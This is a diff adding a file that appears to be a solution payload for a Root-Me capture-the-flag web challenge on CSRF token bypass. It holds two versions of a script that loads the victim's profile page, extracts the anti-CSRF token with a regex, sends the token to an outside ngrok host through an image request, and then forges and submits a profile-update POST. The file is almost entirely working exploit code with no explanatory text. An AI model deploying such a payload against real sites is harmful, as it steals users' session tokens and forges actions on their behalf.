@@ -1,0 +1,61 @@
+<script>
+    var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
+    var loadProfile = new XMLHttpRequest();
+    loadProfile.open("GET", url, false);
+    loadProfile.send();
+    var regex = /name="token"\s+value="([a-f0-9]{32})"/i;
+    var match = regex.exec(loadProfile.responseText);
+
+    if (match) {
+        var token = match[1];
+
+        new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?token=" + token;
+
+        var post = new XMLHttpRequest();
+        post.open("POST", url, true);
+        post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        post.send("username=test1&status=on&token=" + token);
+    } else {
+        new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?err=no_token"
+    }
+</script>
+
+
+<html>
+  <body>
+    <form action="http://challenge01.root-me.org/web-client/ch23/?action=profile"
+          method="POST"
+          enctype="multipart/form-data">
+
+      <input type="hidden" name="username" value="zz" />
+      <input type="hidden" name="status" value="on" />
+      <input type="hidden" name="token" id="token" value="token" />
+
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+      var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
+
+      // GET the profile page
+      var loadProfile = new XMLHttpRequest();
+      loadProfile.open("GET", url, false);
+      loadProfile.send();
+
+      // Extract real token
+      var regex = /name="token"\s+value="([a-f0-9]{32})"/i;
+      var match = regex.exec(loadProfile.responseText);
+
+      // Debug to ngrok
+      new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?token=" + match[1];
+
+      // Replace the form token
+      document.getElementById("token").value = match[1];
+
+      // Submit final POST
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
